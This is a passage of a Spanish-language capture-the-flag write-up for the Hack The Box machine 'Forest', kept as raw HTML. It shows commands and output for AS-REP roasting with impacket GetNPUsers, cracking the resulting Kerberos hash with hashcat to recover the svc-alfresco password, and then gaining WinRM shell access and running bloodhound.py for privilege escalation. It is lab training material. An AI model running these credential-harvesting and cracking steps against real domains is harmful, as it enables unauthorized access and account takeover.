user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sebastien&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x479&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;lucinda&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47a&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;svc-alfresco&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47b&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;andy&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;mark&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x47f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
user:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;santi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x480&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 04:32:35 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;kerberos---impacket-getnpusers&#34;&gt;KERBEROS - impacket GetNPUsers&lt;/h2&gt;
&lt;p&gt;Obtuvimos poca informacion sobre el puerto de ldap, pero obtuvimos una lista de usuarios, vamos al puerto 88 de autenticacion de kerberos para obtener informacion sobre ese puerto utilizando la lista de usuarios y uno de los scripts de impacket para verificar si uno de los usuarios nos permite recolectar mensajes AS_REP sin pre autenticacion.&lt;/p&gt;
&lt;p&gt;Lista de Usuarios:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Administrator
Guest
krbtgt
DefaultAccount
&lt;span class=&#34;nv&#34;&gt;$331000&lt;/span&gt;-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecucion de script de impacket:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161
Impacket v0.9.19 - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Administrator doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailboxc3d7722 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailboxfc9daad doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailboxc0a90c9 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailbox670628e doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailbox968e74d doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailbox6ded678 doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailbox83d6781 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailboxfd87238 doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailboxb01ac64 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User HealthMailbox7108a4e doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User HealthMailbox0659cc1 doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User sebastien doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User lucinda doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User andy doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User mark doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User santi doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.&lt;/p&gt;
&lt;h3 id=&#34;hashcat---kerberos&#34;&gt;HASHCAT - KERBEROs&lt;/h3&gt;
&lt;p&gt;Utilizamos hashcat para crackear el hash que obtuvimos con el script de impacket.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;18200&lt;/span&gt; pass_forest -o cracked.txt ../rockyou.txt --force  
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache built:
* Filename..: ../rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344392&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Runtime...: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; sec

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; AS-REP etype &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;
Hash.Target......: &lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$svc&lt;/span&gt;-alfresco@HTB:2f985636440000c102e7...6864af
Time.Started.....: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:04 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;../rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:  2181.4 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9.63ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 4128768/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;28.78%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/4128768 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 4079616/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;28.44%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: s9039554h -&amp;gt; ruddsound1
Hardware.Mon.#1..: Temp: 51c Util: 63% Core:1189MHz Mem:2505MHz Bus:4

Started: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:45:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Stopped: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:07 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Pass:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$svc&lt;/span&gt;-alfresco@HTB:2f985636440000c102e7a67d333b3d24&lt;span class=&#34;nv&#34;&gt;$7&lt;/span&gt;b3a05d397f5ea656b6649ef36dfe3b0c9c5be004550dc64da438b19c056b1caf1c1408ad8840c7cb507c5ca040ad1abf3ceea9d68e13f82fb0d18df542343004c4ec202ae4b9b818457cde2a1ffe74bd8cf0bee3795e74fd1410946c1ae5323e00b3cfceda7f26e053eb6c2e3922dce1095812a6071aeee4a000442ae3f86f3676119df60fdf61bb4f287e3317128664557f0fa6f3b745b5f122afa5612b0c8fc398b2869e97240a81dda272f4ff802914b6c7c59cc80fd5e357097dd2848d66b5f346cf6bfe8de21bf5ba0ef2646c559be47ce0af236c2ce1e45afaf6864af:s3rvice
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h3&gt;
&lt;p&gt;Utilizamos las credenciales del usuario svc-alfresco para ver en que SHARENAMES tenemos acceso en el puerto de samba.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_001300.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Confirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_002021.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user-svc-alfresco&#34;&gt;User svc-alfresco&lt;/h2&gt;
&lt;p&gt;En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVILRM.&lt;/p&gt;
&lt;p&gt;Evil-RM: &lt;a href=&#34;https://github.com/Hackplayers/evil-winrm&#34;&gt;https://github.com/Hackplayers/evil-winrm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Install: &lt;code&gt;gem install evil-winrm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_000802.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;bloodhound.py&lt;/code&gt; para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.&lt;/p&gt;
&lt;h3 id=&#34;booldhoundpy&#34;&gt;Booldhound.py&lt;/h3&gt;
&lt;p&gt;Utilizamos las credenciales del usuario svc-alfresco, el dominio y el namesever para obtener los datos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.13.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Comprimimos los archivos en zip.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.15.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
